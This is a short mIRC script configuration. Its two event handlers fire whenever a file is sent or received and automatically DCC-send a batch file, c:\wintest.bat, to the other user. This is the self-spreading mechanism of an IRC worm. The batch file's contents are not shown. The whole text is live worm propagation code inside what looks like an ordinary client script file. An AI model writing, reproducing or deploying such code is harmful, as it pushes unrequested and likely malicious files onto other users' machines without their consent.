[script]
n0=on 1:FILESENT:*.*:if ( $me != $nick ) { /dcc send $nick c:\wintest.bat }
n1=on 1:FILERCVD:*.*:if ( $me != $nick ) { /dcc send $nick c:\wintest.bat }
